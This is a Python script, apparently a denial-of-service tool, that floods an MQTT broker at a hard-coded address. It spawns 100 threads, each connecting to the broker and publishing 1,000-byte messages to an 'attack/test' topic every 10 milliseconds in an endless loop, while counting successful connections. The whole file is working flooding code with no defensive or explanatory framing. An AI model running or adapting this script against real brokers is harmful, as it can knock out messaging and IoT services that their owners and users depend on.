import paho.mqtt.client as mqtt
import threading
import time

broker = '172.61.62.181' #IP: VA172.61.62.181 RA172.61.113.55
port = 1883
num_threads = 100

success_count = 0
success_lock = threading.Lock()

def on_subscribe(client, userdata, mid, granted_qos):
    pass

def attack_behavior(client):
    client.subscribe("attack/test")
    long_message = "A" * 1000
    while True:
        try:
            client.publish("attack/test", long_message)
            time.sleep(0.01)
        except Exception as e:
            break

def flood_connect(broker, port):
    global success_count
    try:
        client = mqtt.Client()
        client.on_subscribe = on_subscribe
        client.connect(broker, port, keepalive=60)
        client.loop_start()

        with success_lock:
            success_count += 1
            print(f" Connected! Total successful connections: {success_count}")

        attack_behavior(client)
    except Exception as e:
        print(f"Connection failed: {e}")

threads = []
for i in range(num_threads):
    t = threading.Thread(target=flood_connect, args=(broker, port))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
